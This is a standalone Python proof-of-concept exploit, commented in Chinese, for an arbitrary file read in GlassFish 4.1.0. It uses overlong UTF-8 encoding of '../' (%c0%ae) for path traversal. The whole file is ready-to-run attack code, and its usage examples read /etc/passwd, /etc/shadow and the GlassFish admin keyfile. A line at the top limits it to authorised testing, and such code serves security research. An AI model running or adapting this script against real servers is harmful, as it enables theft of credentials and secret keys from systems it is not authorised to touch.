#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GlassFish 4.1.0 任意文件读取漏洞 PoC
漏洞原理：GlassFish 在处理 URL 时错误地将 %c0%ae 解码为 '.'，导致路径穿越。
影响版本：GlassFish 4.1.0
仅用于授权安全测试与教学研究，请勿用于非法用途。
"""

import argparse
import requests
from urllib.parse import urljoin

def exploit(target_url, file_path, timeout=10, verify_ssl=False):
    """
    利用 UTF-8 Overlong Encoding 读取文件。
    :param target_url: GlassFish 基础 URL，如 http://ip:4848
    :param file_path: 要读取的文件绝对路径，如 /etc/passwd
    :return: (success, content) 或 (False, error_msg)
    """
    # 构建穿越路径：用 %c0%ae%c0%ae/ 表示 ../ ，多层回到根目录
    # 每一组 %c0%ae%c0%ae/ 代表 ../
    traversal = "%c0%ae%c0%ae/" * 10  # 10 级穿越足够到达根目录

    # 基础路径，任意一个存在的静态资源路径均可，这里使用 /theme/META-INF/
    base_path = "/theme/META-INF/"

    # 去掉 file_path 开头的 /，避免双斜杠
    clean_file = file_path.lstrip("/")

    # 拼接完整路径
    full_path = f"{base_path}{traversal}{clean_file}"
    url = urljoin(target_url, full_path)

    try:
        resp = requests.get(url, timeout=timeout, verify=verify_ssl)
        if resp.status_code == 200 and resp.text:
            # 进一步判断是否真的读取到了文件内容（非错误页面）
            # GlassFish 默认错误页面通常会包含特定字符串，可据此过滤
            if "Error report" not in resp.text and "Exception Report" not in resp.text:
                return True, resp.text
            else:
                return False, f"可能返回了错误页面，内容: {resp.text[:200]}"
        else:
            return False, f"状态码 {resp.status_code}，响应长度 {len(resp.text)}"
    except requests.RequestException as e:
        return False, str(e)

def main():
    parser = argparse.ArgumentParser(
        description="GlassFish 4.1.0 任意文件读取 PoC (CVE-2015-... TWSL2015-016)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  python poc.py -u http://192.168.1.1:4848\n"
            "  python poc.py -u https://target:4848 -f /etc/shadow --no-verify\n"
            "  python poc.py -u http://target:4848 -f /glassfish/domains/domain1/config/admin-keyfile"
        )
    )
    parser.add_argument("-u", "--url", required=True, help="GlassFish 基础 URL (例如 http://target:4848)")
    parser.add_argument("-f", "--file", default="/etc/passwd", help="要读取的文件路径 (默认: /etc/passwd)")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数 (默认: 10)")
    parser.add_argument("--no-verify", action="store_true", help="禁用 SSL 证书验证")
    args = parser.parse_args()

    target_url = args.url.rstrip("/")
    file_path = args.file
    verify_ssl = not args.no_verify

    print(f"[*] 目标: {target_url}")
    print(f"[*] 读取文件: {file_path}")

    success, content = exploit(target_url, file_path, args.timeout, verify_ssl)
    if success:
        print("[+] 读取成功，文件内容如下:")
        print("-" * 60)
        print(content)
        print("-" * 60)
    else:
        print(f"[-] 利用失败: {content}")

if __name__ == "__main__":
    main()